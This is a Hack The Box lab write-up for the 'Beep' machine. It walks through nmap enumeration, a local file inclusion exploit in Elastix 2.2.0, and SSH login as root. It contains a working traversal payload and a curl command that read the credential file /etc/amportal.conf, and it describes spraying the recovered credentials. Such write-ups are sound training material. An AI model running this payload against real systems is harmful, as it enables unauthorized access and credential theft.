# Hack The Box - Beep

**OWASP Category: A07:2025 – Vulnerable and Outdated Components** 

After enumerating the open ports of the target, we discovered a running Elastix software on port 443. It was running a legacy exploitable version of Elastix. We exploited a LFI vulnerability in the software that allowed us to discover credentials for SSH authentication.

## Tools:
- **Nmap**
- **Searchsploit**

## Methodology:

1. **Enumerating the target Nmap**

    ```bash
    nmap -A 10.129.229.183
     ```

    - We found these open ports:
    
    22/tcp    open  ssh
    25/tcp    open  smtp
    80/tcp    open  http
    110/tcp   open  pop3
    111/tcp   open  rpcbind
    143/tcp   open  imap
    443/tcp   open  https
    993/tcp   open  imaps
    995/tcp   open  pop3s
    3306/tcp  open  mysql
    4445/tcp  open  upnotifyp
    10000/tcp open  snet-sensor-mgmt

  - On port 443 the target was running a Elastix software.

2. **Exploiting Elastix vulnerability**
    - Using the tools searchsploit, we discovered that the Elastix software version 2.2.0 is vulnerable to a Local File Inclusion vulnerability. The exploit is described here: https://www.exploit-db.com/exploits/37637 .


    - The exploit consists of exploiting the "current_language" parameter in the URL.
    We visit this URL: https://targetip/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action . 
    It shows us a amportal.conf file - thats a configuration file of FreePBX. The file often includes credentials.

    - We sent a GET request to the target URL via curl (we had to add parameter -k, because the target uses a untrusted self-signed certificate).

    ```bash
    curl -vk  "https://10.129.229.183/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action"
    ```

    - The response contains a few credentials:

    <img src="\assets\Beep_credentials.png" alt="searchsploit" width="1000px">

3. **Authenticating with the gained credentials**
    - After spraying the newly gained credentials over the target network, we successfully authenticated to the target via SSH and gained a root shell.
    - We had to add some parameters to ssh command, because the target was using old cryptographic algorithms.

    ```bash
    ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa root@10.129.229.183  
    ```
    <img src="\assets\Beep_shell.png" alt="gained_shell" width="1000px">


# Remediation
Upgrade Elastix to the lastest supported version adn establish a regular patch management.